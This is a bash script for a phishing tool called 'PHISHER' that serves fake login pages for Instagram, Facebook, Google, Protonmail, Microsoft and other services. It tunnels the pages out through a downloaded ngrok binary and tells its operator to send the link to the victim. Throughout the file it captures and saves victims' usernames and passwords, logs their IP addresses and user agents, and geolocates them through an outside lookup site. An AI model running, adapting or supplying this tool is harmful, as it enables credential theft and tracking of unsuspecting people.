#!/bin/bash

trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "PHP Not Found"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "WGET Not Found "; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzio Not Found"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl Not Found"; exit 1; }

}

menu() {

printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m       \e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m        \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m        \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m         \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m          \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m         \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"

read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="google"
start

elif [[ $option == 6 ]]; then
server="spotify"
start

elif [[ $option == 7 ]]; then
server="netflix"
start

elif [[ $option == 8 ]]; then
server="origin"
start

elif [[ $option == 9 ]]; then
server="steam"
start

elif [[ $option == 10 ]]; then
server="yahoo"
start

elif [[ $option == 11 ]]; then
server="linkedin"
start

elif [[ $option == 12 ]]; then
server="protonmail"
start

elif [[ $option == 13 ]]; then
server="wordpress"
start

elif [[ $option == 14 ]]; then
server="microsoft"
start

elif [[ $option == 15 ]]; then
server="instafollowers"
start

elif [[ $option == 16 ]]; then
server="create"
createpage
start

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi


}

banner() {
printf "\e[1;77m  ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   \e[0m\n"
printf "\e[1;77m █       █  █ █  █   █       █  █ █  █       █   ▄  █  \e[0m\n"
printf "\e[1;77m █    ▄  █  █▄█  █   █  ▄▄▄▄▄█  █▄█  █    ▄▄▄█  █ █ █  \e[0m\n"
printf "\e[1;77m █   █▄█ █       █   █ █▄▄▄▄▄█       █   █▄▄▄█   █▄▄█▄ \e[0m\n"
printf "\e[1;77m █    ▄▄▄█   ▄   █   █▄▄▄▄▄  █   ▄   █    ▄▄▄█    ▄▄  █ \e[0m\n"
printf "\e[1;77m █   █   █  █ █  █   █▄▄▄▄▄█ █  █ █  █   █▄▄▄█   █  █ █ \e[0m\n"
printf "\e[1;77m █▄▄▄█   █▄▄█ █▄▄█▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄█  █▄█ V:1.2 \e[0m\n"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: Yezz123 \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Phisher take care please !::\e[0m\n"
printf "\n"
}

createpage() {
default_cap1="Wi-fi Session Expired , Try again"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"black\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else

printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim to open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}
banner
dependencies
menu

